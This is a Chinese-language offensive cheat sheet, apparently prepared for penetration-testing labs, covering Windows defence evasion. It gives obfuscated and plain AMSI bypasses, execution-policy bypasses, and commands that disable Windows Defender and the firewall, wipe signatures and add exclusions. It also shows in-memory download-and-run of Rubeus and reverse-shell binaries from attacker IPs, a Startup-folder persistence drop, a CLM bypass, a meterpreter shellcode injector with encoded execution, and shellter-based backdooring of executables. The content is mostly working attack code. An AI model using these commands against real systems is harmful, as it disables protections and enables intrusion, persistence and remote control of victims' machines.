# 绕过AMSI 

CRTP绕过示例
```
S`eT-It`em ( 'V'+'aR' + 'IA' + ('blE:1'+'q2') + ('uZ'+'x') ) ([TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( Get-varI`A`BLE (('1Q'+'2U') +'zX' ) -VaL )."A`ss`Embly"."GET`TY`Pe"(("{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em') ) )."g`etf`iElD"( ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile') ),( "{2}{4}{0}{1}{3}" -f('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} )
```

普通AMSL绕过示例
```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

```
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Failed") {$f=$e}};$f.SetValue($null,$true)
```

不会被PowerShell autologging检测到的绕过示例
```
[Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
```

# 绕过powershell执行策略
```
powershell -ep bypass

powershell –ExecutionPolicy bypass

powershell –c <cmd>

$env:PSExecutionPolicyPreference="bypass"

PowerShell.exe -ExecutionPolicy Bypass -File xxx.ps1 (cmd下)
```

# 关闭防火墙和windows defend

关闭wd
```
Set-MpPreference -DisableRealtimeMonitoring $true -Verbose

Set-MpPreference -DisableIOAVProtection $true

Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true
```


关闭防火墙
```
NetSh Advfirewall set allprofiles state off
```

查看防火墙
```
netsh advfirewall show currentprofile
```

# 启用wd，删除所有病毒签名
```
"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

# powershell脚本加载

Proxy-aware (加载到内存后直接使用，不会下载到本地)
```
IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
```

Non-proxy aware
```
$h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
```

# 下载执行exe程序

需要注意下面所有方法必须先绕过AMSI
```
# Download and run assembly without arguments

$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/rev.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[rev.Program]::Main()


# Download and run Rubeus, with arguments (make sure to split the args)

$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data)
[Rubeus.Program]::Main("s4u /user:web01$ /rc4:1d77f43d9604e79e5626c6905705801e /impersonateuser:administrator /msdsspn:cifs/file01 /ptt".Split())


# Execute a specific method from an assembly (e.g. a DLL)

$data = (New-Object System.Net.WebClient).DownloadData('http://10.10.16.7/lib.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

# Powershell下载文件

所有版本的powershell
```
(New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
```

4+版本
```
Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
```

# 枚举所有Applocker策略
```
$ExecutionContext.SessionState.LanguageModeConstrainedLanguage

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

# CLM

检查
```
$ExecutionContext.SessionState.LanguageMode
```

绕过
```
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U "C:\Windows\Tasks\clm.exe"
```

# Windows Defender绕过

以下命令需要admin权限

枚举所有wd放行的文件夹
```
Get-MpPreference | select-object -ExpandProperty ExclusionPath
```

加一个排除项文件夹
```
Add-MpPreference -ExclusionPath "C:\Users\Public\Downloads\SuperLegitDownloadDirectory"
```

# PowerShell 内存注入

1. 编译powershell payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.4 LPORT=4444 -f powershell
```

2. ps脚本
```
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);';

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru;

[Byte[]];
[Byte[]] $sc = [第一步生成的payload放在这里，不包括中括号]

$size = 0x1000;

if ($sc.Length -gt 0x1000) {$size = $sc.Length};

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++) {$winFunc::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};

$winFunc::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
```

3. 传送到windows，执行

```
.\av_test.ps1
```

4. 一行powershell执行

> 4.1 用[这个](https://github.com/darkoperator/powershell_scripts/blob/master/ps_encoder.py)py脚本加密
> 4.2 执行 ```python2 ps_encoder.py -s av_test.ps1```
> 4.3 上面生成的加密字符串使用下面命令执行
```
powershell -nop -w hidden -encodedcommand [这里是base64加密字符串，不包括中括号]
```


# shellter

我理解就是把payload注入到正常的exe文件中

1. 安装
```
sudo apt install shellter
apt install wine
```

2. 运行
```
shellter
```

按提示加载需要注入payload 的exe程序，比如nc.exe
选择反弹的payload，比如Meterpreter
选择反弹的LHOST和LPORT

3. 把注入的exe文件传到靶机，双击执行，一般可以绕过反病毒软件

